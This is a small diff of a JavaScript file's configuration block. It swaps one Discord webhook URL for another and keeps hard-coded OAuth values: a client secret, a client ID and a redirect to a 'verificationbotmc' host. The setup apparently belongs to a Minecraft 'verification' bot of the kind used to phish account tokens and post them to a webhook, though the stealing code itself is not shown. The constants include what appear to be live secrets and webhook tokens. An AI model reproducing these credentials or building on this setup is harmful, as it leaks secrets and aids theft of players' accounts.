@@ -2,7 +2,7 @@
 const client_secret = 'Lh-8Q~Dqlnl18VjOpZlOdV15dSTjkWGIKSnbzdv-' 
 const client_id = '715942dd-50ce-46ef-8e53-127363d8fb97'
 const redirect_uri = 'https://verificationbotmc.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1048525552274915338/K9JNAgs9SYg4-dhZ-6SvZg-5Vh5GFOQxWU9XPqLoDeQi7w8Rj4kpYvGOrnYwYkT3sf6Y'
+const webhook_url = 'https://discord.com/api/webhooks/1050769539136237688/mceKiaBQKDumzlGBGLhZLBPjgbP8eUBpZ6XwIfaNBuJ-0hjCw2zzuhsOXchhszP7agzb'
 
 
 //Requirements
